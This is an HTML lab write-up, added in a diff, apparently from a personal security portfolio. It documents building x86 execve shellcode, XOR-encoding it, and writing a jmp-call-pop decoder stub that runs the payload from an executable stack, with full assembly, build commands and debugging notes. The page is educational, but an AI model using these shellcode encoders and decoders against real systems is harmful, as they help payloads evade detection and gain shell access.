@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 3 – XOR Shellcode Decoder and Execution</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+  <div class="container">
+    <h1>🔪 Lab 3: XOR Shellcode Decoder and Execution</h1>
+
+    <h2>🌐 Introduction</h2>
+    <p>This lab focused on building and executing a custom XOR shellcode decoder in x86 assembly. The goal: craft shellcode that executes <code>/bin/sh</code>, encode it with a fixed XOR key, and write a stub that decodes and runs it at runtime. Though the theory was familiar from prior work in binary exploitation, implementing it turned into a multi-day deep dive into segmentation faults, memory protection mechanics, and executable memory behavior on modern Linux systems.</p>
+    <p>What unfolded was a vivid exercise in persistence and precision. We encountered—and overcame—nearly every pitfall possible when executing self-modifying shellcode. In this report, we document that journey in granular detail, preserving the command history and architecture-level insight that led to our success.</p>
+
+    <h2>🛠️ Stage 1: Crafting the Initial Shellcode</h2>
+    <p>We began with standard <code>execve</code> shellcode. The assembly looked like:</p>
+<pre><code class="language-nasm">; shell.asm - execve("/bin//sh", NULL, NULL)
+BITS 32
+global _start
+
+section .text
+_start:
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov edx, eax
+    mov al, 0x0b
+    int 0x80</code></pre>
+
+    <p>We assembled and linked it using:</p>
+<pre><code class="language-bash">nasm -f elf32 shell.asm -o shell.o
+ld -m elf_i386 shell.o -o shell</code></pre>
+    <p>✅ Running <code>./shell</code> dropped us into a shell successfully.</p>
+
+    <h2>🔢 Stage 2: Extracting and Encoding the Shellcode</h2>
+    <p>We dumped the opcodes into a hex-encoded list using a combo of <code>objdump</code> and shell tools:</p>
+<pre><code class="language-bash">objdump -d shell | grep '[0-9a-f]:' | \
+cut -f2 -d: | cut -f1-6 -d' ' | \
+tr -s ' ' | tr '\t' ' ' | \
+sed 's/ $//' | tr ' ' '\n' > shell.hex</code></pre>
+    <p>We counted the bytes:</p>
+<pre><code class="language-bash">wc -l shell.hex  # → 36 lines</code></pre>
+    <p>Then converted the hex dump into raw binary:</p>
+<pre><code class="language-bash">xxd -r -p shell.hex shell.raw
+stat -c %s shell.raw  # → 25 bytes</code></pre>
+    <p>With a working 25-byte shellcode binary, we XOR’d it using a simple Python script:</p>
+<pre><code class="language-python">with open("shell.raw", "rb") as f:
+    buf = f.read()
+
+key = 0xAA
+encoded = [b ^ key for b in buf]
+print(",".join(f"0x{b:02x}" for b in encoded))
+print("Length:", len(encoded))</code></pre>
+    <p>Output:</p>
+<pre><code class="language-plaintext">0x9b, 0x6a, 0xfa, 0xc2, ..., Length: 25 bytes</code></pre>
+
+    <h2>🚨 Stage 3: Building the Decoder – And Entering Segfault Hell</h2>
+    <p>Our initial decoder was simple and closely modeled on canonical examples:</p>
+<pre><code class="language-nasm">BITS 32
+global _start
+
+section .text
+_start:
+    jmp short call_decoder
+
+decoder:
+    pop esi
+    xor ecx, ecx
+    mov cl, payload_len
+    mov bl, xor_key
+.decode:
+    xor byte [esi], bl
+    inc esi
+    loop .decode
+    jmp esi
+
+call_decoder:
+    call decoder
+payload:
+    db 0x9b,0x6a,0xfa,...
+
+payload_len equ 25
+xor_key     equ 0xAA</code></pre>
+    <p>We assembled and linked this with:</p>
+<pre><code class="language-bash">nasm -f elf32 decoder.asm -o decoder.o
+ld -m elf_i386 -z execstack decoder.o -o decoder</code></pre>
+    <p>❌ <code>zsh: segmentation fault  ./decoder</code></p>
+
+    <h2>🔍 Stage 4: Diagnosing the Faults — GDB and Memory Protections</h2>
+    <ul>
+      <li><code>esi</code> pointed to the payload</li>
+      <li>Decoding loop tried to modify memory in-place</li>
+      <li>Segfault happened during decode or <code>jmp esi</code></li>
+    </ul>
+    <p><strong>Findings:</strong></p>
+    <ul>
+      <li><code>.text</code> = RX (exec but not write)</li>
+      <li><code>.data</code> = RW (write but not exec)</li>
+    </ul>
+    <p>We were caught in the classic W^X (Write XOR Execute) trap.</p>
+
+    <h2>🤦 Stage 5: Desperate Fix Attempts</h2>
+    <ul>
+      <li><code>jmp payload_start</code> instead of <code>jmp esi</code></li>
+      <li><code>ret</code> after <code>push</code> decoded address</li>
+      <li>Storing payload in <code>.bss</code></li>
+      <li>Using <code>$ - label</code> math</li>
+    </ul>
+    <p>None of it worked. GDB revealed either invalid pointer or illegal memory access during decode or jump.</p>
+
+    <h2>🚀 Stage 6: The Breakthrough — Writing to the Stack</h2>
+    <p>We rewrote the decoder to decode to a RWX stack buffer:</p>
+<pre><code class="language-nasm">BITS 32
+global _start
+
+section .text
+_start:
+    call get_payload
+
+decoder:
+    pop esi
+    lea edi, [esp - 64]  ; Make space
+    mov ecx, payload_len
+    mov bl, xor_key
+.decode_loop:
+    mov al, [esi]
+    xor al, bl
+    mov [edi], al
+    inc esi
+    inc edi
+    loop .decode_loop
+
+    lea eax, [esp - 64]
+    jmp eax
+
+get_payload:
+    call decoder
+payload:
+    db 0x9b,0x6a,0xfa,...
+
+payload_len equ $ - payload
+xor_key     equ 0xAA</code></pre>
+    <p>Linked with:</p>
+<pre><code class="language-bash">ld -m elf_i386 -z execstack decoder.o -o decoder</code></pre>
+    <p>✅ <strong>Success:</strong> We were dropped into a shell!</p>
+
+    <h2>🔮 Stage 7: GDB Verification and Final Validation</h2>
+    <ul>
+      <li>Decoded shellcode on stack</li>
+      <li>Stack marked RWX</li>
+      <li>EAX → decoded shellcode</li>
+      <li>EIP cleanly transitioned to stack</li>
+    </ul>
+
+    <h2>📝 Lessons Learned</h2>
+    <ul>
+      <li><code>.text</code> is RX, not RW</li>
+      <li><code>.data</code> is RW, not RX</li>
+      <li>Stack is RWX only if linked with <code>-z execstack</code></li>
+      <li>GDB + pwndbg are essential for real progress</li>
+    </ul>
+
+    <h2>📚 Conclusion</h2>
+    <p>This lab forced us to internalize memory permissions, instruction flow, and binary hygiene. It highlighted the fragility and control needed when executing dynamically constructed shellcode in memory. What started as a small shell script evolved into a deeply instructive and hands-on exploration of Linux memory protection.</p>
+
+<h2 id="red-team-value">🔐 Red Teaming Value</h2>
+<p>This lab provided tangible insight into how real-world payloads survive execution constraints. From W^X protections to stack execution, we saw how modern Linux environments block naive shellcode — and how subtle shifts in memory usage make or break an exploit.</p>
+<blockquote>
+  🧠 <strong>Reflection:</strong><br>
+  Debugging our way out of segmentation faults taught me more about low-level execution than any CTF challenge ever has. Seeing memory protections in action made every `jmp`, `pop`, and `lea` mean something real.
+</blockquote>
+
+
+<h2 id="skills">✅ Skills Demonstrated</h2>
+<ul>
+  <li>✅ Shellcode encoding and XOR logic</li>
+  <li>✅ NASM decoder loop construction</li>
+  <li>✅ GDB + pwndbg debugging</li>
+  <li>✅ Executable stack use with <code>-z execstack</code></li>
+  <li>✅ Memory permissions and segmentation awareness</li>
+  <li>✅ Position-independent code via <code>jmp-call-pop</code></li>
+</ul>
+
+
+    <h2 id="next">🚀 Next Labs</h2>
+<ul>
+  <li>Rolling XOR decoders (key shifting)</li>
+  <li>Polymorphic or metamorphic shellcode</li>
+  <li>Shellcode injection into host processes</li>
+  <li>Payload delivery via BOF with runtime decoding</li>
+</ul>
+
+
+    <p><em>All work performed in a self-contained Kali Linux lab. Questions or feedback? <a href="https://www.linkedin.com/in/alnich1/" target="_blank">Let's connect</a>.</em></p>
+    <p><a href="labs.html">⬅ Back to Labs</a></p>
+  </div>
+
+  <button id="mode-toggle">🌙</button>
+  <script src="assets/js/darkmode.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</body>
+</html>
